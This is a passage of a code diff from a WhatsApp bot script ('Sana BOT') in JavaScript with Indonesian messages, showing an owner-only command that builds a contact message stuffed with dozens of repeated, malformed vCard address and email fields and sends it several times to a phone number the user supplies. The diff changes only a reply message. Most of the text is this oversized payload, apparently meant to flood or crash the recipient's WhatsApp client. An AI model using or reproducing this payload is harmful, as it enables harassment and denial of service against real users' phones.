karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
+const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵${philips}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:❴ ㅊ ❈ Sana BOTㅊ ❈ ❵\nitem1.TEL:+6289653430712\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
 jobotz.sendContact(`${text}@s.whatsapp.net`, global.premium, fkontaak)
 jobotz.sendContact(`${text}@s.whatsapp.net`, global.premium, fkontaak)
 jobotz.sendContact(`${text}@s.whatsapp.net`, global.premium, fkontaak)
@@ -5457,9 +5548,9 @@ await m.reply(`Berhasil Mengirim Kintil Di Nomer ${text}`)
 }
 break
 case 'kigaskintil': {
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
-const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵${philips}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵\nitem1.TEL:+6289653430712\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do 